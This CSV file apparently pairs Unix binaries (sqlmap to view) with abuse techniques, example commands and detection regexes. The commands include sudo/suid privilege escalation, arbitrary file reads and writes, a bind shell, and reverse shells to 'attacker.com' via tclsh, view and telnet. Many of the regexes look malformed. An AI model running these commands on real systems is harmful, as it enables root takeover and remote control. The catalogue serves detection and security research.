Name,Function,ExampleCode,Regex
sqlmap,sudo,"sudo sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')""","(?i)(?:sudo\s+)?(?:\S*/)?sqlmap\s*\-u\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
ss,file-read,ss -a -F $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?ss\s*\-a\s*\-F\s+.*)
ss,suid,./ss -a -F $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?ss\s*\-a\s*\-F\s+.*)
ss,sudo,sudo ss -a -F $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?ss\s*\-a\s*\-F\s+.*)
ssh-agent,shell,ssh-agent /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?ssh\-agent\s+.*/bin/sh)
ssh-agent,suid,./ssh-agent /bin/ -p,(?i)(?:sudo\s+)?(?:\S*/)?ssh\-agent\s*\-p\s+.*)
ssh-agent,sudo,sudo ssh-agent /bin/,(?i)(?:sudo\s+)?(?:\S*/)?ssh\-agent\s+.*)
ssh-keygen,library-load,ssh-keygen -D ./lib.so,(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keygen\s*\-D\s+.*)
ssh-keygen,sudo,sudo ssh-keygen -D ./lib.so,(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keygen\s*\-D\s+.*)
ssh-keygen,suid,./ssh-keygen -D ./lib.so,(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keygen\s*\-D\s+.*)
ssh-keyscan,file-read,ssh-keyscan -f $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keyscan\s*\-f\s+.*)
ssh-keyscan,suid,./ssh-keyscan -f $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keyscan\s*\-f\s+.*)
ssh-keyscan,sudo,sudo ssh-keyscan -f $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keyscan\s*\-f\s+.*)
ssh,shell,ssh localhost $SHELL --noprofile --norc,(?i)(?:sudo\s+)?(?:\S*/)?ssh\s+.*)
ssh,shell,ssh -o ProxyCommand=';sh 0<&2 1>&2' x,(?i)(?:sudo\s+)?(?:\S*/)?ssh\s*\-o\s+.*)
ssh,shell,ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host,(?i)(?:sudo\s+)?(?:\S*/)?ssh\s*\-o\s*\-o\s+.*/bin/sh)
ssh,file-upload,"ssh $HOST ""cat > $RPATH"" < $LPATH",(?i)(?:sudo\s+)?(?:\S*/)?ssh\s+.*)
ssh,file-download,"ssh $HOST ""cat $RPATH"" > $LPATH",(?i)(?:sudo\s+)?(?:\S*/)?ssh\s+.*)
ssh,file-read,ssh -F $LFILE localhost,(?i)(?:sudo\s+)?(?:\S*/)?ssh\s*\-F\s+.*)
ssh,sudo,sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x,(?i)(?:sudo\s+)?(?:\S*/)?ssh\s*\-o\s+.*)
sshpass,shell,sshpass /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?sshpass\s+.*/bin/sh)
sshpass,suid,./sshpass /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?sshpass\s*\-p\s+.*/bin/sh)
sshpass,sudo,sudo sshpass /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?sshpass\s+.*/bin/sh)
start-stop-daemon,shell,start-stop-daemon -n $RANDOM -S -x /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?start\-stop\-daemon\s*\-n\s*\-S\s*\-x\s+.*/bin/sh)
start-stop-daemon,suid,./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p,(?i)(?:sudo\s+)?(?:\S*/)?start\-stop\-daemon\s*\-n\s*\-S\s*\-x\s*\-p\s+.*/bin/sh)
start-stop-daemon,sudo,sudo start-stop-daemon -n $RANDOM -S -x /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?start\-stop\-daemon\s*\-n\s*\-S\s*\-x\s+.*/bin/sh)
stdbuf,shell,stdbuf -i0 /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?stdbuf\s+.*/bin/sh)
stdbuf,suid,./stdbuf -i0 /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?stdbuf\s*\-p\s+.*/bin/sh)
stdbuf,sudo,sudo stdbuf -i0 /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?stdbuf\s+.*/bin/sh)
strace,file-write,strace -s 999 -o $LFILE strace - DATA,(?i)(?:sudo\s+)?(?:\S*/)?strace\s*\-s\s*\-o\s+.*)
strace,shell,strace -o /dev/null /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?strace\s*\-o\s+.*/bin/sh)
strace,suid,./strace -o /dev/null /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?strace\s*\-o\s*\-p\s+.*/bin/sh)
strace,sudo,sudo strace -o /dev/null /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?strace\s*\-o\s+.*/bin/sh)
strings,file-read,"strings ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?strings\s+.*)
strings,suid,"./strings ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?strings\s+.*)
strings,sudo,"sudo strings ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?strings\s+.*)
su,sudo,sudo su,(?i)(?:sudo\s+)?(?:\S*/)?su\s+.*)
sudo,sudo,sudo sudo /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?sudo\s+.*/bin/sh)
sysctl,command,"sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id",(?i)(?:sudo\s+)?(?:\S*/)?sysctl\s+.*)
sysctl,file-read,"/usr/sbin/sysctl -n ""/../../$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?sysctl\s*\-n\s+.*)
sysctl,suid,"./sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id",(?i)(?:sudo\s+)?(?:\S*/)?sysctl\s+.*)
sysctl,sudo,"sudo sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id",(?i)(?:sudo\s+)?(?:\S*/)?sysctl\s+.*)
systemctl,suid,"echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c ""id > /tmp/output""
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF",(?i)(?:sudo\s+)?(?:\S*/)?systemctl\s*\-c\s+.*/bin/sh)
systemctl,sudo,"echo /bin/sh >$TF
chmod +x $TF
sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice",(?i)(?:sudo\s+)?(?:\S*/)?systemctl\s+.*/bin/sh)
systemctl,sudo,"echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c ""id > /tmp/output""
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF",(?i)(?:sudo\s+)?(?:\S*/)?systemctl\s*\-c\s+.*/bin/sh)
systemctl,sudo,"sudo systemctl
!sh",(?i)(?:sudo\s+)?(?:\S*/)?systemctl\s+.*)
systemd-resolve,sudo,"sudo systemd-resolve --status
!sh",(?i)(?:sudo\s+)?(?:\S*/)?systemd\-resolve\s+.*)
tac,file-read,"tac -s 'RANDOM' ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?tac\s*\-s\s+.*)
tac,suid,"./tac -s 'RANDOM' ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?tac\s*\-s\s+.*)
tac,sudo,"sudo tac -s 'RANDOM' ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?tac\s*\-s\s+.*)
tail,file-read,"tail -c1G ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?tail\s+.*)
tail,suid,"./tail -c1G ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?tail\s+.*)
tail,sudo,"sudo tail -c1G ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?tail\s+.*)
tar,shell,tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?tar\s+.*/bin/sh)
tar,shell,"tar xf /dev/null -I '/bin/sh -c ""sh <&2 1>&2""'",(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-I\s*\-c\s+.*/bin/sh)
tar,shell,"echo '/bin/sh 0<&1' > ""$TF""
tar cf ""$TF.tar"" ""$TF""
tar xf ""$TF.tar"" --to-command sh
rm ""$TF""*",(?i)(?:sudo\s+)?(?:\S*/)?tar\s+.*/bin/sh)
tar,file-upload,tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh,(?i)(?:sudo\s+)?(?:\S*/)?tar\s+.*)
tar,file-download,tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh,(?i)(?:sudo\s+)?(?:\S*/)?tar\s+.*)
tar,file-write,"echo DATA > ""$TF""
tar c --xform ""s@.*@$LFILE@"" -OP ""$TF"" | tar x -P",(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-P\s+.*)
tar,file-read,"tar xf ""$LFILE"" -I '/bin/sh -c ""cat 1>&2""'",(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-I\s*\-c\s+.*/bin/sh)
tar,sudo,sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?tar\s+.*/bin/sh)
tar,limited-suid,./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?tar\s+.*/bin/sh)
task,shell,task execute /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?task\s+.*/bin/sh)
task,sudo,sudo task execute /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?task\s+.*/bin/sh)
taskset,shell,taskset 1 /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?taskset\s+.*/bin/sh)
taskset,suid,./taskset 1 /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?taskset\s*\-p\s+.*/bin/sh)
taskset,sudo,sudo taskset 1 /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?taskset\s+.*/bin/sh)
tasksh,shell,"tasksh
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?tasksh\s+.*/bin/sh)
tasksh,limited-suid,"./tasksh
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?tasksh\s+.*/bin/sh)
tasksh,sudo,"sudo tasksh
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?tasksh\s+.*/bin/sh)
tbl,file-read,tbl $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?tbl\s+.*)
tbl,suid,./tbl $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?tbl\s+.*)
tbl,sudo,sudo tbl $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?tbl\s+.*)
tclsh,shell,"tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr",(?i)(?:sudo\s+)?(?:\S*/)?tclsh\s+.*/bin/sh)
tclsh,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh",(?i)(?:sudo\s+)?(?:\S*/)?tclsh\s+.*socket)
tclsh,suid,"./tclsh
exec /bin/sh -p <@stdin >@stdout 2>@stderr",(?i)(?:sudo\s+)?(?:\S*/)?tclsh\s*\-p\s+.*/bin/sh)
tclsh,sudo,"sudo tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr",(?i)(?:sudo\s+)?(?:\S*/)?tclsh\s+.*/bin/sh)
tcpdump,command,"echo ""$COMMAND"" > $TF
chmod +x $TF
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF",(?i)(?:sudo\s+)?(?:\S*/)?tcpdump\s*\-i\s*\-w\s*\-W\s*\-G\s*\-z\s+.*)
tcpdump,sudo,"echo ""$COMMAND"" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root",(?i)(?:sudo\s+)?(?:\S*/)?tcpdump\s*\-i\s*\-w\s*\-W\s*\-G\s*\-z\s*\-Z\s+.*)
tdbtool,shell,"tdbtool
! /bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?tdbtool\s+.*/bin/sh)
tdbtool,sudo,"sudo tdbtool
! /bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?tdbtool\s+.*/bin/sh)
tdbtool,limited-suid,"./tdbtool
! /bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?tdbtool\s+.*/bin/sh)
tee,file-write,"echo DATA | ./tee -a ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?tee\s*\-a\s+.*)
tee,suid,"echo DATA | ./tee -a ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?tee\s*\-a\s+.*)
tee,sudo,"echo DATA | sudo tee -a ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?tee\s*\-a\s+.*)
telnet,shell,"telnet $RHOST $RPORT
^]
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?telnet\s+.*/bin/sh)
telnet,reverse-shell,mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF,(?i)(?:sudo\s+)?(?:\S*/)?telnet\s+.*/bin/sh)
telnet,sudo,"sudo telnet $RHOST $RPORT
^]
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?telnet\s+.*/bin/sh)
telnet,limited-suid,"./telnet $RHOST $RPORT
^]
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?telnet\s+.*/bin/sh)
terraform,file-read,"terraform console
file(""file_to_read"")",(?i)(?:sudo\s+)?(?:\S*/)?terraform\s+.*)
terraform,sudo,"sudo terraform console
file(""file_to_read"")",(?i)(?:sudo\s+)?(?:\S*/)?terraform\s+.*)
terraform,suid,"./terraform console
file(""file_to_read"")",(?i)(?:sudo\s+)?(?:\S*/)?terraform\s+.*)
tex,shell,tex --shell-escape '\write18{/bin/sh}\end',(?i)(?:sudo\s+)?(?:\S*/)?tex\s+.*/bin/sh)
tex,sudo,sudo tex --shell-escape '\write18{/bin/sh}\end',(?i)(?:sudo\s+)?(?:\S*/)?tex\s+.*/bin/sh)
tex,limited-suid,./tex --shell-escape '\write18{/bin/sh}\end',(?i)(?:sudo\s+)?(?:\S*/)?tex\s+.*/bin/sh)
tftp,file-upload,"tftp $RHOST
put file_to_send",(?i)(?:sudo\s+)?(?:\S*/)?tftp\s+.*)
tftp,file-download,"tftp $RHOST
get file_to_get",(?i)(?:sudo\s+)?(?:\S*/)?tftp\s+.*)
tftp,suid,"./tftp $RHOST
put file_to_send",(?i)(?:sudo\s+)?(?:\S*/)?tftp\s+.*)
tftp,sudo,"sudo tftp $RHOST
put file_to_send",(?i)(?:sudo\s+)?(?:\S*/)?tftp\s+.*)
tic,file-read,"tic -C ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?tic\s*\-C\s+.*)
tic,suid,"./tic -C ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?tic\s*\-C\s+.*)
tic,sudo,"sudo tic -C ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?tic\s*\-C\s+.*)
time,shell,/usr/bin/time /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?time\s+.*/bin/sh)
time,suid,./time /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?time\s*\-p\s+.*/bin/sh)
time,sudo,sudo /usr/bin/time /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?time\s+.*/bin/sh)
timedatectl,shell,"timedatectl list-timezones
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?timedatectl\s+.*/bin/sh)
timedatectl,sudo,"sudo timedatectl list-timezones
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?timedatectl\s+.*/bin/sh)
timeout,shell,timeout 7d /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?timeout\s+.*/bin/sh)
timeout,suid,./timeout 7d /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?timeout\s*\-p\s+.*/bin/sh)
timeout,sudo,sudo timeout --foreground 7d /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?timeout\s+.*/bin/sh)
tmate,shell,tmate -c /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?tmate\s*\-c\s+.*/bin/sh)
tmate,sudo,sudo tmate -c /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?tmate\s*\-c\s+.*/bin/sh)
tmate,limited-suid,./tmate -c /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?tmate\s*\-c\s+.*/bin/sh)
tmux,file-read,tmux -f $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?tmux\s*\-f\s+.*)
tmux,shell,tmux,(?i)(?:sudo\s+)?(?:\S*/)?tmux\s+.*)
tmux,shell,tmux -S /path/to/socket_name,(?i)(?:sudo\s+)?(?:\S*/)?tmux\s*\-S\s+.*socket)
tmux,sudo,sudo tmux,(?i)(?:sudo\s+)?(?:\S*/)?tmux\s+.*)
top,shell,"echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
reset",(?i)(?:sudo\s+)?(?:\S*/)?top\s*\-e\s+.*/bin/sh)
top,sudo,"echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
sudo top
reset",(?i)(?:sudo\s+)?(?:\S*/)?top\s*\-e\s+.*/bin/sh)
torify,shell,torify /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?torify\s+.*/bin/sh)
torify,sudo,sudo torify /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?torify\s+.*/bin/sh)
torsocks,shell,torsocks /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?torsocks\s+.*/bin/sh)
torsocks,sudo,sudo torsocks /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?torsocks\s+.*/bin/sh)
troff,file-read,troff $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?troff\s+.*)
troff,suid,./troff $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?troff\s+.*)
troff,sudo,sudo troff $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?troff\s+.*)
tshark,shell,"echo 'os.execute(""/bin/sh"")' >$TF
tshark -Xlua_script:$TF",(?i)(?:sudo\s+)?(?:\S*/)?tshark\s+.*/bin/sh)
ul,file-read,"ul ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?ul\s+.*)
ul,suid,"./ul ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?ul\s+.*)
ul,sudo,"sudo ul ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?ul\s+.*)
unexpand,file-read,"unexpand -t99999999 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?unexpand\s+.*)
unexpand,suid,"./unexpand -t99999999 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?unexpand\s+.*)
unexpand,sudo,"sudo unexpand -t99999999 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?unexpand\s+.*)
uniq,file-read,"uniq ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?uniq\s+.*)
uniq,suid,"./uniq ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?uniq\s+.*)
uniq,sudo,"sudo uniq ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?uniq\s+.*)
unshare,shell,unshare /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?unshare\s+.*/bin/sh)
unshare,suid,./unshare -r /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?unshare\s*\-r\s+.*/bin/sh)
unshare,sudo,sudo unshare /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?unshare\s+.*/bin/sh)
unsquashfs,sudo,"sudo unsquashfs shell
./squashfs-root/sh -p",(?i)(?:sudo\s+)?(?:\S*/)?unsquashfs\s*\-p\s+.*)
unsquashfs,suid,"./unsquashfs shell
./squashfs-root/sh -p",(?i)(?:sudo\s+)?(?:\S*/)?unsquashfs\s*\-p\s+.*)
unzip,sudo,"sudo unzip -K shell.zip
./sh -p",(?i)(?:sudo\s+)?(?:\S*/)?unzip\s*\-K\s*\-p\s+.*)
unzip,suid,"./unzip -K shell.zip
./sh -p",(?i)(?:sudo\s+)?(?:\S*/)?unzip\s*\-K\s*\-p\s+.*)
update-alternatives,sudo,"echo DATA >$TF
sudo update-alternatives --force --install ""$LFILE"" x ""$TF"" 0",(?i)(?:sudo\s+)?(?:\S*/)?update\-alternatives\s+.*)
update-alternatives,suid,"echo DATA >$TF
./update-alternatives --force --install ""$LFILE"" x ""$TF"" 0",(?i)(?:sudo\s+)?(?:\S*/)?update\-alternatives\s+.*)
uudecode,file-read,"uuencode ""$LFILE"" /dev/stdout | uudecode",(?i)(?:sudo\s+)?(?:\S*/)?uudecode\s+.*)
uudecode,suid,"uuencode ""$LFILE"" /dev/stdout | uudecode",(?i)(?:sudo\s+)?(?:\S*/)?uudecode\s+.*)
uudecode,sudo,"sudo uuencode ""$LFILE"" /dev/stdout | uudecode",(?i)(?:sudo\s+)?(?:\S*/)?uudecode\s+.*)
uuencode,file-read,"uuencode ""$LFILE"" /dev/stdout | uudecode",(?i)(?:sudo\s+)?(?:\S*/)?uuencode\s+.*)
uuencode,suid,"uuencode ""$LFILE"" /dev/stdout | uudecode",(?i)(?:sudo\s+)?(?:\S*/)?uuencode\s+.*)
uuencode,sudo,"sudo uuencode ""$LFILE"" /dev/stdout | uudecode",(?i)(?:sudo\s+)?(?:\S*/)?uuencode\s+.*)
vagrant,shell,"cd $(mktemp -d)
echo 'exec ""/bin/sh""' > Vagrantfile
vagrant up",(?i)(?:sudo\s+)?(?:\S*/)?vagrant\s*\-d\s+.*/bin/sh)
vagrant,sudo,"cd $(mktemp -d)
echo 'exec ""/bin/sh""' > Vagrantfile
vagrant up",(?i)(?:sudo\s+)?(?:\S*/)?vagrant\s*\-d\s+.*/bin/sh)
vagrant,suid,"cd $(mktemp -d)
echo 'exec ""/bin/sh -p""' > Vagrantfile
vagrant up",(?i)(?:sudo\s+)?(?:\S*/)?vagrant\s*\-d\s*\-p\s+.*/bin/sh)
valgrind,shell,valgrind /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?valgrind\s+.*/bin/sh)
valgrind,sudo,sudo valgrind /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?valgrind\s+.*/bin/sh)
varnishncsa,sudo,"sudo varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?varnishncsa\s*\-g\s*\-q\s*\-F\s*\-w\s+.*)
varnishncsa,suid,"./varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?varnishncsa\s*\-g\s*\-q\s*\-F\s*\-w\s+.*)
vi,shell,vi -c ':!/bin/sh' /dev/null,(?i)(?:sudo\s+)?(?:\S*/)?vi\s*\-c\s+.*/bin/sh)
vi,shell,"vi
:set shell=/bin/sh
:shell",(?i)(?:sudo\s+)?(?:\S*/)?vi\s+.*/bin/sh)
vi,file-write,"vi file_to_write
iDATA
^[
w",(?i)(?:sudo\s+)?(?:\S*/)?vi\s+.*)
vi,file-read,vi file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?vi\s+.*)
vi,sudo,sudo vi -c ':!/bin/sh' /dev/null,(?i)(?:sudo\s+)?(?:\S*/)?vi\s*\-c\s+.*/bin/sh)
view,shell,view -c ':!/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*/bin/sh)
view,shell,"view
:set shell=/bin/sh
:shell",(?i)(?:sudo\s+)?(?:\S*/)?view\s+.*/bin/sh)
view,shell,"view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*/bin/sh)
view,shell,"view -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*)
view,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
view -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'","(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*socket)"
view,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
view -c ':lua local s=require(""socket""); local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
while true do
local r,x=t:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));t:send(b);
end;
f:close();t:close();'","(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
view,non-interactive-bind-shell,"export LPORT=12345
view -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));c:send(b);
end;c:close();f:close();'","(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
